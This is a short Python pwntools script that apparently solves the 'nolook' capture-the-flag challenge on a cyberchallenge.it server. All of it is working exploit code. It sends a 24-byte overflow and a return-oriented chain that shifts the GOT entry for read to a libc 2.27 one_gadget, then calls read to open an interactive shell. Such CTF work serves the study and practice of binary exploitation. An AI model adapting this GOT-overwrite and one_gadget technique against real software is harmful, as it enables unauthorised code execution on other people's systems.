from pwn import *

one_gadget_addr = 0x4f2c5
add_r14_r15 = 0x00000000004005af # add qword ptr [r14 + 0x90], r15; ret;
pop_r14_15 = 0x0000000000400680 # pop r14; pop r15; ret;

exe = ELF('nolook')
libc = ELF('libc-2.27.so')

p = remote('nolook.challs.cyberchallenge.it', 9135)

print(exe.got.read)
print(libc.symbols.read)

chain = (
	b"A" * 24
  + p64(pop_r14_15)                    
  + p64(exe.got.read - 0x90)         
  + p64((one_gadget_addr - libc.symbols.read) % 2**64)
  + p64(add_r14_r15)
  + p64(exe.plt.read)
)

p.send(chain)
p.interactive()